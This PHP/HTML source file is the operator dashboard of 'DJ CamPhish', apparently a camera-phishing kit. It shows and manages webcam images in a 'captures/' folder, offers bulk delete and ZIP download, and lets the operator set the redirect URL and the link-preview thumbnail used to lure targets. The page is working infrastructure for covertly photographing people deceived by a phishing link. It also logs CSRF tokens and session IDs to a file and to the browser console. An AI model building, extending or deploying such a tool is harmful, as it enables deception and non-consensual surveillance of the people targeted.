<?php
session_start();
require_once 'config.php';
$config = require 'config.php';

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

// Log session ID for debugging
if ($config['logging']) {
    file_put_contents('logs.txt', json_encode([
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => 'gallery session start',
        'session_id' => session_id()
    ]) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// CSRF token (Generate if missing)
if (empty($_SESSION['csrf_token']) || empty($_SESSION['csrf_random'])) {
    $_SESSION['csrf_random'] = bin2hex(random_bytes(16));
    $_SESSION['csrf_token'] = hash_hmac('sha256', $_SESSION['csrf_random'], $config['security']['csrf_secret']);
    if ($config['logging']) {
        file_put_contents('logs.txt', json_encode([
            'timestamp' => date('Y-m-d H:i:s'),
            'event' => 'CSRF token generated',
            'token' => $_SESSION['csrf_token'],
            'random' => $_SESSION['csrf_random'],
            'session_id' => session_id()
        ]) . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}

// Load Images
$dir = "captures/";
$images = [];
if (is_dir($dir) && is_readable($dir)) {
    $files = array_diff(scandir($dir), ['..', '.']);
    foreach ($files as $file) {
        if (is_file($dir . $file) && preg_match('/\.(jpg|jpeg|png|gif|webp)$/i', $file)) {
            $images[] = $file;
        }
    }
    rsort($images); // Sort by newest first
} else {
    if ($config['logging']) {
        file_put_contents('logs.txt', json_encode([
            'timestamp' => date('Y-m-d H:i:s'),
            'error' => 'Failed to read captures directory',
            'path' => $dir
        ]) . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}

$redirectFile = 'redirect.txt';
$currentRedirect = file_exists($redirectFile) ? trim(file_get_contents($redirectFile)) : '';
$thumbFile = 'thumbnail.png';
$currentThumb = file_exists($thumbFile) ? $thumbFile . '?' . time() : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>DJ Camphish - Gallery</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #111827; color: #f9fafb; min-height: 100vh; display: flex; flex-direction: column; }
        .image-container { transition: transform 0.3s ease, box-shadow 0.3s ease; border-radius: 12px; overflow: hidden; cursor: pointer; position: relative; }
        .image-container.selected { border: 3px solid #06b6d4; box-shadow: 0 0 0 3px #06b6d4, 0 8px 20px rgba(6,182,212,0.4); transform: scale(0.98); opacity: 0.95; }
        .image-container:hover { transform: scale(1.02); box-shadow: 0 8px 30px rgba(0,229,255,0.15); }
        .image-container img { display: block; width: 100%; height: 100%; object-fit: cover; }
        .toast { transition: all 0.4s cubic-bezier(0.25,0.8,0.25,1); transform: translate(-50%, 20px); opacity: 0; }
        .toast.show { opacity: 1; transform: translate(-50%, -10px); }
        .navbar { backdrop-filter: blur(12px); background: rgba(17,24,39,0.95); }
        .btn { transition: all 0.3s ease; font-weight: 500; }
        .btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .modal-enter { animation: modalFadeIn 0.3s ease-out; }
        @keyframes modalFadeIn { from { opacity: 0; transform: scale(0.98) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
        [data-tooltip]:hover::after {
            content: attr(data-tooltip);
            @apply absolute z-10 bg-gray-800 text-white text-sm px-2 py-1 rounded mt-2;
        }
    </style>
</head>
<body>
    <nav class="navbar sticky top-0 left-0 right-0 border-b border-gray-800 z-50 shadow-xl">
        <div class="max-w-7xl mx-auto px-4 py-4">
            <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-3">
                <h1 class="text-4xl lg:text-5xl font-extrabold flex items-center justify-center lg:justify-start gap-3 text-teal-400 w-full lg:w-auto text-center lg:text-left mx-auto lg:mx-0">
                    <span class="tracking-wider">DJ CamPhish</span>
                </h1>
                <div class="flex gap-3 w-full lg:w-auto lg:hidden">
                    <button id="urlSettingsBtn" class="btn bg-teal-600 hover:bg-teal-700 text-white px-4 py-2 rounded-lg flex items-center justify-center gap-2 shadow-md w-1/2" data-tooltip="">
                        <span class="text-xl">⚙️</span> Settings
                    </button>
                    <a href="logout.php" class="btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg flex items-center justify-center gap-2 shadow-md w-1/2" data-tooltip="">
                        <span class="text-xl">🚪</span> Logout
                    </a>
                </div>
                <div class="hidden lg:flex flex-row gap-3 mt-0">
                    <button id="urlSettingsBtnDesktop" class="btn bg-teal-600 hover:bg-teal-700 text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md w-auto" data-tooltip="">
                        <span class="text-xl">⚙️</span> Settings
                    </button>
                    <button id="deleteBtnDesktop" disabled class="btn bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg flex items-center gap-2 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed shadow-md w-auto" data-tooltip=" Selected">
                        <span class="text-xl">🗑️</span> Delete
                    </button>
                    <button id="downloadBtnDesktop" disabled class="btn bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg flex items-center gap-2 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed shadow-md w-auto" data-tooltip=" Selected">
                        <span class="text-xl">⬇️</span> Download
                    </button>
                    <a href="logout.php" class="btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md w-auto" data-tooltip="">
                        <span class="text-xl">🚪</span> Logout
                    </a>
                </div>
            </div>
            <div class="flex gap-3 mt-3 lg:mt-0 lg:hidden">
                <button id="deleteBtn" disabled class="btn bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg flex items-center justify-center gap-2 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed shadow-md w-1/2" data-tooltip=" Selected">
                    <span class="text-xl">🗑️</span> Delete
                </button>
                <button id="downloadBtn" disabled class="btn bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg flex items-center justify-center gap-2 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed shadow-md w-1/2" data-tooltip=" Selected">
                    <span class="text-xl">⬇️</span> Download
                </button>
            </div>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto px-4 pt-8 lg:pt-10 pb-8 flex-1">
        <?php if (empty($images)): ?>
            <div class="text-center py-20 bg-gray-800 rounded-xl mt-10 shadow-inner">
                <p class="text-2xl font-light text-gray-400">No captures found yet. Start your campaign! 📸</p>
            </div>
        <?php else: ?>
            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4 sm:gap-6" role="grid" aria-label="Image gallery">
                <?php foreach ($images as $img): 
                    if (is_file($dir . $img) && preg_match('/\.(jpg|jpeg|png|gif|webp)$/i', $img)):
                ?>
                    <div class="image-container relative shadow-xl h-56" data-filename="<?= htmlspecialchars($img) ?>" role="gridcell" tabindex="0">
                        <img src="captures/<?= htmlspecialchars($img) ?>" alt="<?= htmlspecialchars($img) ?>" loading="lazy">
                    </div>
                <?php endif; endforeach; ?>
            </div>
        <?php endif; ?>
        <!-- Debug Output for Images -->
        <?php if ($config['logging'] && empty($images)): ?>
            <div class="text-center mt-4 text-gray-400">
                <pre>Debug: No images found in captures</pre>
            </div>
        <?php endif; ?>
    </main>

    <div id="urlSettingsModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-[60] p-4">
        <div class="bg-gray-800 rounded-xl p-6 w-full max-w-lg shadow-2xl modal-enter border border-gray-700">
            <h2 class="text-2xl font-bold mb-6 text-teal-400 flex items-center gap-2 border-b border-gray-700 pb-2">
                <span class="text-xl">⚙️</span> URL & Thumbnail Settings
            </h2>
            <form id="settingsForm" enctype="multipart/form-data">
                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                <label class="block mb-2 text-sm font-medium text-gray-300">Redirect URL:</label>
                <input type="url" name="redirect" value="<?= htmlspecialchars($currentRedirect) ?>" placeholder="https://example.com" required class="w-full bg-gray-700 text-white border border-gray-600 rounded-lg px-4 py-2 mb-6 focus:ring-2 focus:ring-teal-500 outline-none">
                <label class="block mb-2 text-sm font-medium text-gray-300">Upload Thumbnail (600x315):</label>
                <input type="file" id="thumbFile" name="thumbnail" accept="image/*" class="w-full text-gray-300 mb-4 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-teal-500 file:text-white hover:file:bg-teal-600 cursor-pointer">
                <div id="thumbPreviewContainer" class="mb-6">
                    <img id="thumbPreview" src="<?= htmlspecialchars($currentThumb) ?>" class="w-full max-w-xs h-auto rounded-md border border-gray-600 <?= empty($currentThumb) ? 'hidden' : '' ?>" alt="Thumbnail Preview">
                </div>
                <div class="flex justify-end gap-3 mt-6 pt-4 border-t border-gray-700">
                    <button type="button" id="closeModal" class="btn bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg">Cancel</button>
                    <button type="submit" class="btn bg-teal-600 hover:bg-teal-700 text-white px-4 py-2 rounded-lg">💾 Save</button>
                </div>
            </form>
        </div>
    </div>

    <footer class="bg-gray-800 border-t border-gray-700 text-gray-400 text-center py-4 text-sm lg:text-base">
        &copy; <?= date('Y') ?> DJ Camphish | Made with <span class="text-red-500">❤️</span> by Dhananjay Sah
    </footer>

    <div id="toast" class="toast fixed bottom-6 left-1/2 bg-gray-800 text-white px-6 py-3 rounded-xl shadow-2xl pointer-events-none z-[100] border border-gray-700"></div>

    <script>
        let csrfToken = '<?= htmlspecialchars($_SESSION['csrf_token']) ?>';
        console.log('Initial CSRF Token:', csrfToken); // Debug CSRF token

        // Fetch new CSRF token if undefined
        async function refreshCsrfToken() {
            if (!csrfToken) {
                try {
                    const response = await fetch('get_csrf_token.php', {
                        method: 'GET',
                        headers: { 'Accept': 'application/json' }
                    });
                    const data = await response.json();
                    if (data.csrf_token) {
                        csrfToken = data.csrf_token;
                        console.log('Refreshed CSRF Token:', csrfToken);
                    } else {
                        console.error('Failed to refresh CSRF token:', data);
                    }
                } catch (e) {
                    console.error('Error refreshing CSRF token:', e);
                }
            }
        }

        const containers = document.querySelectorAll('.image-container');
        const toast = document.getElementById('toast');
        const modal = document.getElementById('urlSettingsModal');
        const thumbFileInput = document.getElementById('thumbFile');
        const thumbPreview = document.getElementById('thumbPreview');
        const deleteBtn = document.getElementById('deleteBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        const deleteBtnDesktop = document.getElementById('deleteBtnDesktop');
        const downloadBtnDesktop = document.getElementById('downloadBtnDesktop');
        const urlSettingsBtn = document.getElementById('urlSettingsBtn');
        const urlSettingsBtnDesktop = document.getElementById('urlSettingsBtnDesktop');
        let selected = new Set();

        function showToast(msg, isError = false) {
            toast.textContent = msg;
            toast.className = `toast fixed bottom-6 left-1/2 px-6 py-3 rounded-xl shadow-2xl z-[100] border ${isError ? 'bg-red-700 border-red-600' : 'bg-green-600 border-green-500'} text-white show`;
            setTimeout(() => toast.classList.remove('show'), 4000);
        }

        function updateActionButtonsState() {
            const isDisabled = selected.size === 0;
            deleteBtn.disabled = isDisabled;
            downloadBtn.disabled = isDisabled;
            deleteBtnDesktop.disabled = isDisabled;
            downloadBtnDesktop.disabled = isDisabled;
        }

        function toggleSelection(container) {
            const filename = container.getAttribute('data-filename');
            if (selected.has(filename)) {
                selected.delete(filename);
                container.classList.remove('selected');
            } else {
                selected.add(filename);
                container.classList.add('selected');
            }
            updateActionButtonsState();
        }

        containers.forEach(container => {
            container.addEventListener('click', () => toggleSelection(container));
            container.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    toggleSelection(container);
                }
            });
        });

        async function deleteHandler() {
            if (selected.size === 0) {
                showToast('No images selected.', true);
                return;
            }
            if (!confirm(`Are you sure you want to delete ${selected.size} image(s)?`)) return;
            await refreshCsrfToken();
            if (!csrfToken) {
                console.error('CSRF token is undefined');
                showToast('Error: CSRF token missing. Please refresh the page.', true);
                return;
            }
            showToast('Deleting images...', false);
            try {
                const payload = { images: Array.from(selected), csrf_token: csrfToken };
                console.log('Delete payload:', JSON.stringify(payload, null, 2)); // Debug payload
                const response = await fetch('delete_images.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                console.log('Delete response:', JSON.stringify(data, null, 2)); // Debug response
                if (response.ok && data.success) {
                    selected.forEach(filename => {
                        const el = document.querySelector(`[data-filename="${filename}"]`);
                        if (el) el.remove();
                    });
                    selected.clear();
                    updateActionButtonsState();
                    showToast('Images deleted successfully! 🗑️');
                } else {
                    showToast(data.error || 'Error deleting images.', true);
                    console.error('Delete error:', data);
                }
            } catch (e) {
                showToast(`Error: ${e.message}`, true);
                console.error('Delete fetch error:', e);
            }
        }

        async function downloadHandler() {
            if (selected.size === 0) {
                showToast('No images selected.', true);
                return;
            }
            if (selected.size === 1) {
                const filename = Array.from(selected)[0];
                const link = document.createElement('a');
                link.href = `captures/${filename}`;
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                showToast(`Downloaded ${filename}! ⬇️`);
                return;
            }
            await refreshCsrfToken();
            if (!csrfToken) {
                console.error('CSRF token is undefined');
                showToast('Error: CSRF token missing. Please refresh the page.', true);
                return;
            }
            showToast('Preparing ZIP download...', false);
            try {
                const payload = { images: Array.from(selected), csrf_token: csrfToken };
                console.log('Download payload:', JSON.stringify(payload, null, 2)); // Debug payload
                const response = await fetch('download_images.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'captured_images.zip';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                    showToast('ZIP download complete! ⬇️');
                } else {
                    const data = await response.json();
                    showToast(data.error || 'Error generating ZIP.', true);
                    console.error('Download error:', data);
                }
            } catch (e) {
                showToast(`Error: ${e.message}`, true);
                console.error('Download fetch error:', e);
            }
        }

        deleteBtn.addEventListener('click', deleteHandler);
        deleteBtnDesktop.addEventListener('click', deleteHandler);
        downloadBtn.addEventListener('click', downloadHandler);
        downloadBtnDesktop.addEventListener('click', downloadHandler);
        urlSettingsBtn.addEventListener('click', () => modal.classList.remove('hidden'));
        urlSettingsBtnDesktop.addEventListener('click', () => modal.classList.remove('hidden'));
        document.getElementById('closeModal').addEventListener('click', () => modal.classList.add('hidden'));

        document.getElementById('settingsForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await refreshCsrfToken();
            if (!csrfToken) {
                console.error('CSRF token is undefined');
                showToast('Error: CSRF token missing. Please refresh the page.', true);
                return;
            }
            const formData = new FormData(e.target);
            formData.set('csrf_token', csrfToken); // Ensure CSRF token in FormData
            console.log('Settings form data:', Object.fromEntries(formData)); // Debug FormData
            showToast('Saving settings...', false);
            try {
                const response = await fetch('update_redirect.php', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                console.log('Settings response:', JSON.stringify(data, null, 2)); // Debug response
                if (response.ok && data.success) {
                    showToast('Settings updated! ✅');
                    modal.classList.add('hidden');
                    if (thumbFileInput.files[0]) {
                        thumbPreview.src = URL.createObjectURL(thumbFileInput.files[0]);
                        thumbPreview.classList.remove('hidden');
                    } else if (data.thumbnail_path) {
                        thumbPreview.src = data.thumbnail_path + '?' + Date.now();
                        thumbPreview.classList.remove('hidden');
                    }
                } else {
                    showToast(data.error || 'Error updating settings.', true);
                    console.error('Settings update error:', data);
                }
            } catch (e) {
                showToast(`Error: ${e.message}`, true);
                console.error('Settings fetch error:', e);
            }
        });

        thumbFileInput.addEventListener('change', (e) => {
            if (e.target.files[0]) {
                thumbPreview.src = URL.createObjectURL(e.target.files[0]);
                thumbPreview.classList.remove('hidden');
            }
        });
    </script>
</body>
</html>